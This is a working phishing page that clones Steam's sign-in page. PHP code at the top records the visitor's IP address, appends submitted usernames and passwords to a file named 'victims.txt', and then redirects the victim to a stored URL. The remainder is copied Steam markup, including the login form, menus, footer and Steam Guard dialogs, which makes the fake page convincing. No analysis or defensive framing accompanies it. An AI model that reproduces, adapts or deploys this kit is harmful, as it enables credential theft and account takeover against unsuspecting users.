<?php
function get_IP_address()
{
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
        }
    }
}
fwrite(fopen('ip.txt','w'),get_IP_address());
?>
<?php
$u = $_POST['username'];
$p = $_POST['password'];
$f = fopen('redir.txt','r');
$r = fread($f,filesize("redir.txt"));
fclose($f);
if ($u && $p){
    $f = fopen('victims.txt','a+');
    fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
    fclose($f);
    die('<script>window.location = "'.$r.'"</script>');
}
?>
<!DOCTYPE html>
<html class=" responsive" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
			<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="theme-color" content="#171a21">
		<title>Sign In</title>
	<link rel="shortcut icon" href="https://store.steampowered.com/favicon.ico" type="image/x-icon">

	
	
	<link href="./Sign In_files/motiva_sans.css" rel="stylesheet" type="text/css">
<link href="./Sign In_files/shared_global.css" rel="stylesheet" type="text/css">
<link href="./Sign In_files/buttons.css" rel="stylesheet" type="text/css">
<link href="./Sign In_files/store.css" rel="stylesheet" type="text/css">
<link href="./Sign In_files/cart.css" rel="stylesheet" type="text/css">
<link href="./Sign In_files/browse.css" rel="stylesheet" type="text/css">
<link href="./Sign In_files/login.css" rel="stylesheet" type="text/css">
<link href="./Sign In_files/shared_responsive.css" rel="stylesheet" type="text/css">
			<script async="" src="./Sign In_files/analytics.js"></script><script>
				(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
					m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
				})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

				ga('create', 'UA-33786258-1', 'auto', {
					'sampleRate': 0.4				});
				ga('set', 'dimension1', false );
				ga('set', 'dimension2', 'External' );
				ga('set', 'dimension3', 'login' );
				ga('set', 'dimension4', "login\/login" );
				ga('send', 'pageview' );

			</script>
			<script type="text/javascript">Object.seal && Object.seal( Object.prototype );</script><script type="text/javascript" src="./Sign In_files/jquery-1.8.3.min.js"></script>
<script type="text/javascript">$J = jQuery.noConflict();</script><script type="text/javascript">VALVE_PUBLIC_PATH = "https:\/\/store.akamai.steamstatic.com\/public\/";</script><script type="text/javascript" src="./Sign In_files/tooltip.js"></script>

<script type="text/javascript" src="./Sign In_files/shared_global.js"></script>

<script type="text/javascript" src="./Sign In_files/main.js"></script>

<script type="text/javascript" src="./Sign In_files/dynamicstore.js"></script>


		<script type="text/javascript">
			document.addEventListener('DOMContentLoaded', function(event) {
				$J.data( document, 'x_readytime', new Date().getTime() );
				$J.data( document, 'x_oldref', GetNavCookie() );
				SetupTooltips( { tooltipCSSClass: 'store_tooltip'} );
		});
		</script><script type="text/javascript" src="./Sign In_files/login.js"></script>
<script type="text/javascript" src="./Sign In_files/shared_responsive_adapter.js"></script>

						<meta name="twitter:card" content="summary_large_image">
			
	<meta name="twitter:site" content="@steam">

						<meta property="og:title" content="Sign In">
					<meta property="twitter:title" content="Sign In">
					<meta property="og:type" content="website">
					<meta property="fb:app_id" content="105386699540688">
					<meta property="og:site" content="Steam">
			
	
			<link rel="image_src" href="https://store.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
		<meta property="og:image" content="https://store.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
		<meta name="twitter:image" content="https://store.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
					<meta property="og:image:secure" content="https://store.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
		
	
	
	
	</head>
<body class="login v6 responsive_page">

<div class="responsive_page_frame with_header">

						<div class="responsive_page_menu_ctn mainmenu">
				<div class="responsive_page_menu" id="responsive_page_menu">
										<div class="mainmenu_contents">
						<div class="mainmenu_contents_items">
															<a class="menuitem" href="https://store.steampowered.com/login/?redir=login%2F&amp;redir_ssl=1&amp;snr=1_60_4__global-header">
									Login								</a>
								<a class="menuitem supernav" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		Store	</a>
	<div class="submenu_store" style="display: none;" data-submenuid="store">
		<a class="submenuitem" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">Home</a>
					<a class="submenuitem" href="https://store.steampowered.com/explore/?snr=1_60_4__global-responsive-menu">Discovery Queue</a>
				<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Wishlist</a>
		<a class="submenuitem" href="https://store.steampowered.com/points/shop/?snr=1_60_4__global-responsive-menu">Points Shop</a>	
       	<a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-responsive-menu">News</a>
					<a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-responsive-menu">Stats</a>
					</div>


			<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
			Community		</a>
		<div class="submenu_community" style="display: none;" data-submenuid="community">
			<a class="submenuitem" href="https://steamcommunity.com/">Home</a>
			<a class="submenuitem" href="https://steamcommunity.com/discussions/">Discussions</a>
			<a class="submenuitem" href="https://steamcommunity.com/workshop/">Workshop</a>
			<a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
			<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Broadcasts</a>
											</div>
		

	
	
	<a class="menuitem" href="https://help.steampowered.com/en/">
		Support	</a>

							<div class="minor_menu_items">
																								<div class="menuitem change_language_action">
									Change language								</div>
																																	<div class="menuitem" onclick="Responsive_RequestDesktopView();">
										View desktop website									</div>
															</div>
						</div>
						<div class="mainmenu_footer_spacer  "></div>
						<div class="mainmenu_footer">
															<div class="mainmenu_footer_logo"><img src="./Sign In_files/logo_valve_footer.png"></div>
								© Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.								<span class="mainmenu_valve_links">
									<a href="https://store.steampowered.com/privacy_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Privacy Policy</a>
									&nbsp;| &nbsp;<a href="http://www.valvesoftware.com/legal.htm" target="_blank">Legal</a>
									&nbsp;| &nbsp;<a href="https://store.steampowered.com/subscriber_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Steam Subscriber Agreement</a>
									&nbsp;| &nbsp;<a href="https://store.steampowered.com/steam_refunds/?snr=1_60_4__global-responsive-menu" target="_blank">Refunds</a>
								</span>
													</div>
					</div>
									</div>
			</div>
		
		<div class="responsive_local_menu_tab">

		</div>

		<div class="responsive_page_menu_ctn localmenu">
			<div class="responsive_page_menu" id="responsive_page_local_menu">
				<div class="localmenu_content">
				</div>
			</div>
		</div>



					<div class="responsive_header">
				<div class="responsive_header_content">
					<div id="responsive_menu_logo">
						<img src="./Sign In_files/header_menu_hamburger.png" height="100%">
											</div>
					<div class="responsive_header_logo">
						<a href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">
															<img src="./Sign In_files/header_logo.png" height="36" border="0" alt="STEAM">
													</a>
					</div>					
				</div>
			</div>
		
		<div class="responsive_page_content_overlay">

		</div>

		<div class="responsive_fixonscroll_ctn nonresponsive_hidden ">
		</div>
	
	<div class="responsive_page_content">

		<div id="global_header" data-gpnav="columns">
	<div class="content">
		<div class="logo">
			<span id="logo_holder">
									<a href="https://store.steampowered.com/?snr=1_60_4__global-header">
						<img src="./Sign In_files/logo_steam.svg" width="176" height="44">
					</a>
							</span>
		</div>

			<div class="supernav_container">
	<a class="menuitem supernav" href="https://store.steampowered.com/?snr=1_60_4__global-header" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		STORE	</a>
	<div class="submenu_store" style="display: none;" data-submenuid="store">
		<a class="submenuitem" href="https://store.steampowered.com/?snr=1_60_4__global-header">Home</a>
					<a class="submenuitem" href="https://store.steampowered.com/explore/?snr=1_60_4__global-header">Discovery Queue</a>
				<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Wishlist</a>
		<a class="submenuitem" href="https://store.steampowered.com/points/shop/?snr=1_60_4__global-header">Points Shop</a>	
       	<a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-header">News</a>
					<a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-header">Stats</a>
					</div>


			<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
			COMMUNITY		</a>
		<div class="submenu_community" style="display: none;" data-submenuid="community">
			<a class="submenuitem" href="https://steamcommunity.com/">Home</a>
			<a class="submenuitem" href="https://steamcommunity.com/discussions/">Discussions</a>
			<a class="submenuitem" href="https://steamcommunity.com/workshop/">Workshop</a>
			<a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
			<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Broadcasts</a>
											</div>
		

	
						<a class="menuitem" href="https://store.steampowered.com/about/?snr=1_60_4__global-header">
				ABOUT			</a>
			
	<a class="menuitem" href="https://help.steampowered.com/en/">
		SUPPORT	</a>
	</div>
	<script type="text/javascript">
		jQuery(function($) {
			$('#global_header .supernav').v_tooltip({'location':'bottom', 'destroyWhenDone': false, 'tooltipClass': 'supernav_content', 'offsetY':-4, 'offsetX': 1, 'horizontalSnap': 4, 'tooltipParent': '#global_header .supernav_container', 'correctForScreenSize': false});
		});
	</script>

		<div id="global_actions">
			<div id="global_action_menu">
									<div class="header_installsteam_btn header_installsteam_btn_green">

						<a class="header_installsteam_btn_content" href="https://store.steampowered.com/about/?snr=1_60_4__global-header">
							Install Steam						</a>
					</div>
				
				
														<a class="global_action_link" href="https://store.steampowered.com/login/?redir=login%2F&amp;redir_ssl=1&amp;snr=1_60_4__global-header">login</a>
											&nbsp;|&nbsp;
						<span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, &#39;language_dropdown&#39;, &#39;right&#39; );">language</span>
						<div class="popup_block_new" id="language_dropdown" style="display: none;">
							<div class="popup_body popup_menu">
																																					<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=schinese" onclick="ChangeLanguage( &#39;schinese&#39; ); return false;">简体中文 (Simplified Chinese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=tchinese" onclick="ChangeLanguage( &#39;tchinese&#39; ); return false;">繁體中文 (Traditional Chinese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=japanese" onclick="ChangeLanguage( &#39;japanese&#39; ); return false;">日本語 (Japanese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=koreana" onclick="ChangeLanguage( &#39;koreana&#39; ); return false;">한국어 (Korean)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=thai" onclick="ChangeLanguage( &#39;thai&#39; ); return false;">ไทย (Thai)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=bulgarian" onclick="ChangeLanguage( &#39;bulgarian&#39; ); return false;">Български (Bulgarian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=czech" onclick="ChangeLanguage( &#39;czech&#39; ); return false;">Čeština (Czech)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=danish" onclick="ChangeLanguage( &#39;danish&#39; ); return false;">Dansk (Danish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=german" onclick="ChangeLanguage( &#39;german&#39; ); return false;">Deutsch (German)</a>
																																							<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=spanish" onclick="ChangeLanguage( &#39;spanish&#39; ); return false;">Español - España (Spanish - Spain)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=latam" onclick="ChangeLanguage( &#39;latam&#39; ); return false;">Español - Latinoamérica (Spanish - Latin America)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=greek" onclick="ChangeLanguage( &#39;greek&#39; ); return false;">Ελληνικά (Greek)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=french" onclick="ChangeLanguage( &#39;french&#39; ); return false;">Français (French)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=italian" onclick="ChangeLanguage( &#39;italian&#39; ); return false;">Italiano (Italian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=hungarian" onclick="ChangeLanguage( &#39;hungarian&#39; ); return false;">Magyar (Hungarian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=dutch" onclick="ChangeLanguage( &#39;dutch&#39; ); return false;">Nederlands (Dutch)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=norwegian" onclick="ChangeLanguage( &#39;norwegian&#39; ); return false;">Norsk (Norwegian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=polish" onclick="ChangeLanguage( &#39;polish&#39; ); return false;">Polski (Polish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=portuguese" onclick="ChangeLanguage( &#39;portuguese&#39; ); return false;">Português (Portuguese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=brazilian" onclick="ChangeLanguage( &#39;brazilian&#39; ); return false;">Português - Brasil (Portuguese - Brazil)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=romanian" onclick="ChangeLanguage( &#39;romanian&#39; ); return false;">Română (Romanian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=russian" onclick="ChangeLanguage( &#39;russian&#39; ); return false;">Русский (Russian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=finnish" onclick="ChangeLanguage( &#39;finnish&#39; ); return false;">Suomi (Finnish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=swedish" onclick="ChangeLanguage( &#39;swedish&#39; ); return false;">Svenska (Swedish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=turkish" onclick="ChangeLanguage( &#39;turkish&#39; ); return false;">Türkçe (Turkish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=vietnamese" onclick="ChangeLanguage( &#39;vietnamese&#39; ); return false;">Tiếng Việt (Vietnamese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=ukrainian" onclick="ChangeLanguage( &#39;ukrainian&#39; ); return false;">Українська (Ukrainian)</a>
																									<a class="popup_menu_item tight" href="http://translation.steampowered.com/" target="_blank">Help us translate Steam</a>
							</div>
						</div>
												</div>
					</div>
			</div>
</div>
<div id="responsive_store_nav_ctn"></div><div data-cart-banner-spot="1"></div>
		<div class="responsive_page_template_content">

			<script type="text/javascript">
	$J( function() {
		var loginOpts =  {
			strRedirectURL: "https:\/\/store.steampowered.com\/",
			gidCaptcha: -1		};

		
		var LoginManger = new CLoginPromptManager( 'https://store.steampowered.com/', loginOpts );

					document.forms['logon'].elements['username'].focus();
		
			} );
</script>
<div class="page_content">
	
	
<div class="page_content_flex">
	<div class="login_left_col ">
		<div class="login_credential_ctn">
			<div class="loginbox login_col_padding">
				<div class="loginbox_left">
					<div class="loginbox_content">
						<div class="login_title">Sign In</div>

						<div id="error_display" class="checkout_error" style="display: none;"></div>
						<form name="logon" action="" method="POST" id="login_form" style="display: block;">
							<div class="login_row">
								<div class="input_title">Steam account name</div>
								<input class="text_field" type="text" name="username" id="input_username" placeholder="" value="">
							</div>
							<div class="login_row">
								<div class="input_title">Password</div>
								<input class="text_field" type="password" name="password" id="input_password" autocomplete="off" placeholder="">
							</div>
							
							
							<div class="login_row" id="captcha_entry" style="display: none;">
																<div id="captcha_image_row">
									<img style="float: left;" id="captchaImg" src="./Sign In_files/blank.gif" border="0" width="206" height="40">
									<div id="captchaRefresh">
										<span class="linkspan" id="captchaRefreshLink">Refresh</span>
									</div>
									<div style="clear: left;"></div>
								</div>
								<br>
								<div class="input_title">Enter the characters above</div>
								<input class="text_field" id="input_captcha" type="text" name="captcha_text">
							</div>
							<div style="display: none;"><input type="submit"></div>
						</form>

						<noscript><p>Javascript must be enabled to use this site</p></noscript>
						<script>
							document.getElementById('login_form').style.display = 'block';
						</script>

						<div class="login_btn_ctn">
							<div id="login_btn_signin">
								<button type="submit" class="btn_blue_steamui btn_medium login_btn">
									<span>Sign In</span>
								</button>
																	<a target="_top" href="https://help.steampowered.com/en/wizard/HelpWithLogin?redir=store%2Flogin%2F" id="link_forgot_password">
										Forgot your password?									</a>
															</div>
							<div id="login_btn_wait" style="display: none;">
										<div class="LoadingWrapper">
			<div class="LoadingThrobber">
				<div class="Bar Bar1"></div>
				<div class="Bar Bar2"></div>
				<div class="Bar Bar3"></div>
			</div>
					</div>
									</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="login_right_col login_col_padding">
		<div class="login_join_desc subtext">Join Steam and discover thousands of games to play.</div>
		<a class="login_join_desc about_link" href="https://store.steampowered.com/about">Learn More</a>
		<img alt="Join Steam" class="join_image" src="./Sign In_files/join_pc.png">
		<div class="login_btn_ctn">
			<div class="subtext">It's free and easy to use.</div>
			<a target="_top" href="https://store.steampowered.com/join/?&amp;snr=1_60_4__62" class="btnv6_white_transparent btn_medium">
				<span>Join Steam</span>
			</a>
		</div>
	</div>
</div></div>
<!-- End Main Background -->

		</div>	<!-- responsive_page_legacy_content -->

		<div id="footer_spacer" style="" class=""></div>
<div id="footer" class="">
<div class="footer_content">
	<div class="rule"></div>

	<div id="footer_nav">

		
		
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_steam_pulldown">
				<span>ABOUT STEAM</span>
			</span>
		<div class="popup_block_new" id="footer_steam_dropdown" style="display: none;">
						<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://store.steampowered.com/about/?snr=1_44_44__22">
					What is Steam?				</a>
				<!--
					<a class="popup_menu_item" href="">
						Download Steam now					</a>
					-->
				<a class="popup_menu_item" href="https://support.steampowered.com/kb_article.php?p_faqid=549#gifts" target="_blank" rel="noreferrer">
					Gifting on Steam				</a>
				<a class="popup_menu_item" href="https://steamcommunity.com/?snr=1_44_44__22">
					The Steam Community				</a>
			</div>
					</div>
	
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_valve_pulldown">
				<span>ABOUT VALVE</span>
			</span>
		<div class="popup_block_new" id="footer_valve_dropdown" style="display: none;">
			<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="http://www.valvesoftware.com/about.html" target="_blank" rel="noreferrer">
					About Valve				</a>
				<a class="popup_menu_item" href="http://www.valvesoftware.com/business/" target="_blank" rel="noreferrer">
					Business Solutions				</a>
				<a class="popup_menu_item" href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">
					Steamworks				</a>
				<a class="popup_menu_item" href="http://www.valvesoftware.com/jobs.html" target="_blank" rel="noreferrer">
					Jobs				</a>
			</div>
		</div>
			
			
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_help_pulldown">
				<span>HELP</span>
			</span>
		<div class="popup_block_new" id="footer_help_dropdown" style="display: none;">
						<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://help.steampowered.com/en/?snr=1_44_44__23">
					Support				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/forums/?snr=1_44_44__23" target="_blank" rel="noreferrer">
					Forums				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/stats/?snr=1_44_44__23" target="_blank" rel="noreferrer">
					Stats				</a>
			</div>
					</div>

			
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_feeds_pulldown">
				<span>NEWS FEEDS</span>
			</span>
		<div class="popup_block_new" id="footer_feeds_dropdown" style="display: none;">
			<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://store.steampowered.com/feeds/news.xml">
					<img src="./Sign In_files/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Steam News				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/feeds/newreleases.xml">
					<img src="./Sign In_files/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Game Releases				</a>
				<a class="popup_menu_item" href="https://store.steampowered.com/feeds/daily_deals.xml">
					<img src="./Sign In_files/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Daily Deals				</a>
			</div>
		</div>
		<div style="clear: left;"></div>

		<script type="text/javascript">
			RegisterFlyout( 'footer_genre_pulldown', 'footer_genre_dropdown', null, null, true );
			RegisterFlyout( 'footer_steam_pulldown', 'footer_steam_dropdown', null, null, true );
			RegisterFlyout( 'footer_valve_pulldown', 'footer_valve_dropdown', null, null, true );
			RegisterFlyout( 'footer_help_pulldown', 'footer_help_dropdown', null, null, true );
			RegisterFlyout( 'footer_feeds_pulldown', 'footer_feeds_dropdown', null, null, true );
		</script>
	</div>

	<br>

    <div class="rule"></div>
				<div id="footer_logo_steam"><img src="./Sign In_files/logo_steam_footer.png" alt="Valve Software" border="0"></div>
	
    <div id="footer_logo"><a href="http://www.valvesoftware.com/" target="_blank" rel="noreferrer"><img src="./Sign In_files/footerLogo_valve_new.png" alt="Valve Software" border="0"></a></div>
    <div id="footer_text">
        <div>© 2021 Valve Corporation.  All rights reserved.  All trademarks are property of their respective owners in the US and other countries.</div>
        <div>VAT included in all prices where applicable.&nbsp;&nbsp;

            <a href="https://store.steampowered.com/privacy_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Privacy Policy</a>
            &nbsp; | &nbsp;
            <a href="https://store.steampowered.com/legal/?snr=1_44_44_" target="_blank" rel="noreferrer">Legal</a>
            &nbsp; | &nbsp;
            <a href="https://store.steampowered.com/subscriber_agreement/?snr=1_44_44_" target="_blank" rel="noreferrer">Steam Subscriber Agreement</a>
            &nbsp; | &nbsp;
            <a href="https://store.steampowered.com/steam_refunds/?snr=1_44_44_" target="_blank" rel="noreferrer">Refunds</a>

        </div>
					<div class="responsive_optin_link">
				<div class="btn_medium btnv6_grey_black" onclick="Responsive_RequestMobileView()">
					<span>View mobile website</span>
				</div>
			</div>
		
    </div>



    <div style="clear: left;"></div>
	<br>

    <div class="rule"></div>

    <div class="valve_links">
        <a href="http://www.valvesoftware.com/about.html" target="_blank" rel="noreferrer">About Valve</a>
        &nbsp; | &nbsp;<a href="http://www.steampowered.com/steamworks/" target="_blank" rel="noreferrer">Steamworks</a>
        &nbsp; | &nbsp;<a href="http://www.valvesoftware.com/jobs.html" target="_blank" rel="noreferrer">Jobs</a>
        &nbsp; | &nbsp;<a href="https://partner.steamgames.com/steamdirect" target="_blank" rel="noreferrer">Steam Distribution</a>
        		&nbsp; | &nbsp;<a href="https://store.steampowered.com/digitalgiftcards/?snr=1_44_44_" target="_blank" rel="noreferrer">Gift Cards</a>
		&nbsp; | &nbsp;<a href="https://steamcommunity.com/linkfilter/?url=http://www.facebook.com/Steam" target="_blank" rel="noopener"><img src="./Sign In_files/ico_facebook.gif"> Steam</a>
		&nbsp; | &nbsp;<a href="http://twitter.com/steam" target="_blank" rel="noreferrer"><img src="./Sign In_files/ico_twitter.gif"> @steam</a>
            </div>

</div>
</div>
	</div>	<!-- responsive_page_content -->

</div>	<!-- responsive_page_frame -->

<div id="loginModals">
	<div class="login_modal loginAuthCodeModal" style="display: none">
		<form data-ajax="false">
			<div class="auth_message_area">
				<div id="auth_icon" class="auth_icon auth_icon_key">
				</div>
				<div class="auth_messages" id="auth_messages">
					<div class="auth_message" id="auth_message_entercode" style="display: none;">
						<div class="auth_modal_h1">Hello!</div>
						<p>We see you're logging in to Steam from a new browser or a new computer.  Or maybe it's just been a while...</p>
					</div>
					<div class="auth_message" id="auth_message_checkspam" style="display: none;">
						<div class="auth_modal_h1">Mistaken for spam?</div>
						<p>Did you check your spam folder?  If you don't see a recent message from Steam Support in your inbox, try looking there.</p>
					</div>
					<div class="auth_message" id="auth_message_success" style="display: none;">
						<div class="auth_modal_h1">Success!</div>
						<p>You now have access to your Steam account here.</p>
					</div>
					<div class="auth_message" id="auth_message_incorrectcode" style="display: none;">
						<div class="auth_modal_h1">Whoops!</div>
						<p>Sorry but, <br>that isn't quite right...</p>
					</div>
					<div class="auth_message" id="auth_message_help" style="display: none;">
						<div class="auth_modal_h1">Let us help!</div>
						<p>Sorry you're having trouble.  We know your Steam account is valuable to you, and we're committed to helping you keep access to it in the right hands.</p>
					</div>
				</div>
			</div>
			<div id="auth_details_messages" class="auth_details_messages">
				<div class="auth_details" id="auth_details_entercode" style="display: none;">
					As an added account security measure, you’ll need to grant access to this browser by entering the special code we’ve just sent to your email address at <span id="emailauth_entercode_emaildomain"></span>.				</div>
				<div class="auth_details" id="auth_details_success" style="display: none;">
					If this is a public computer, be sure to log out of Steam when you're ready to quit this browser session.				</div>
				<div class="auth_details" id="auth_details_help" style="display: none;">
					Please contact Steam Support for assistance from a member of our staff.  Legitimate claims for help with account access are our number one priority.				</div>
			</div>
			<div class="authcode_entry_area">
				<div id="authcode_entry">
					<div class="authcode_entry_box">
						<input class="authcode_entry_input authcode_placeholder" id="authcode" type="text" value="" placeholder="enter your code here">

					</div>
				</div>
				<div id="authcode_help_supportlink">
					<a href="https://support.steampowered.com/kb_article.php?ref=4020-ALZM-5519&amp;l=english" data-ajax="false" data-externallink="1">Contact Steam Support for help with account access</a>
				</div>
			</div>
			<div class="modal_buttons" id="auth_buttonsets">
				<div class="auth_buttonset" id="auth_buttonset_entercode" style="display: none;">
					<div data-modalstate="submit" class="auth_button leftbtn">
						<div class="auth_button_h3">Submit</div>
						<div class="auth_button_h5">my special access code</div>
					</div>
					<div data-modalstate="checkspam" class="auth_button">
						<div class="auth_button_h3">What message?</div>
						<div class="auth_button_h5">I don't have any message from Steam Support...</div>
					</div>
					<div style="clear: left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_checkspam" style="display: none;">
					<div data-modalstate="submit" class="auth_button leftbtn">
						<div class="auth_button_h3">Found it!</div>
						<div class="auth_button_h5">and I've entered my special access code above</div>
					</div>
					<div data-modalstate="help" class="auth_button">
						<div class="auth_button_h3">No luck still...</div>
						<div class="auth_button_h5">I don't have any message from Steam Support...</div>
					</div>
					<div style="clear: left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_success" style="display: none;">
					<div class="auth_button auth_button_spacer">
					</div>
					<a data-modalstate="complete" class="auth_button" id="success_continue_btn" href="javascript:void(0);">
						<div class="auth_button_h3">Proceed to Steam!</div>
						<div class="auth_button_h5">&nbsp;<br>&nbsp;</div>
					</a>
					<div style="clear: left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_incorrectcode" style="display: none;">
					<div data-modalstate="submit" class="auth_button leftbtn">
						<div class="auth_button_h3">I want to try again</div>
						<div class="auth_button_h5">and I've re-entered my special access code above</div>
					</div>
					<div data-modalstate="help" class="auth_button">
						<div class="auth_button_h3">Please help</div>
						<div class="auth_button_h5">I think I need assistance from Steam Support...</div>
					</div>
					<div style="clear: left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_waiting" style="display: none;">
				</div>
			</div>
			<div style="" id="auth_details_computer_name" class="auth_details_messages">
				To easily recognize this browser among the list of devices Steam Guard has enabled, give the browser a friendly name - at least 6 characters long.				<div id="friendly_name_box" class="friendly_name_box">
					<input class="authcode_entry_input authcode_placeholder" id="friendlyname" type="text" placeholder="enter a friendly name here">
				</div>
			</div>
			<div style="display: none;">
				<input type="submit">
			</div>
		</form>
	</div>

	<div class="login_modal loginIPTModal" style="display: none">
		<div class="auth_message_area">
			<div class="auth_icon ipt_icon">
			</div>
			<div class="auth_messages">
				<div class="auth_message">
					<div class="auth_modal_h1">Sorry</div>
					<p>This account can't be accessed from this computer without additional authorization.</p>
				</div>
			</div>
		</div>
		<div class="auth_details_messages">
			<div class="auth_details">
				Please contact Steam Support to have a member of our staff assist you.  Legitimate claims for help with account access are our number one priority.			</div>
		</div>
		<div class="authcode_entry_area">
		</div>
		<div class="modal_buttons">
			<div class="auth_buttonset">
				<a href="https://support.steampowered.com/kb_article.php?ref=9400-IPAX-9398&amp;l=english" class="auth_button leftbtn" data-ajax="false" data-externallink="1">
					<div class="auth_button_h3">Learn more</div>
					<div class="auth_button_h5">about Intel® Identity Protection Technology</div>
				</a>
				<a href="https://support.steampowered.com/" class="auth_button" data-ajax="false" data-externallink="1">
					<div class="auth_button_h3">Please help</div>
					<div class="auth_button_h5">I think I need assistance from Steam Support...</div>
				</a>
				<div style="clear: left;"></div>
			</div>
		</div>
	</div>



	<div class="login_modal loginTwoFactorCodeModal" style="display: none;">
		<form>
		<div class="twofactorauth_message_area">
			<div id="login_twofactorauth_icon" class="auth_icon auth_icon_key">
			</div>
			<div class="twofactorauth_messages" id="login_twofactorauth_messages">
				<div class="twofactorauth_message" id="login_twofactorauth_message_entercode" style="display: none;">
					<div class="auth_modal_h1">Hello <span id="login_twofactorauth_message_entercode_accountname"></span>!</div>
					<p>This account is currently using a Steam Guard Mobile Authenticator.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_incorrectcode" style="display: none;">
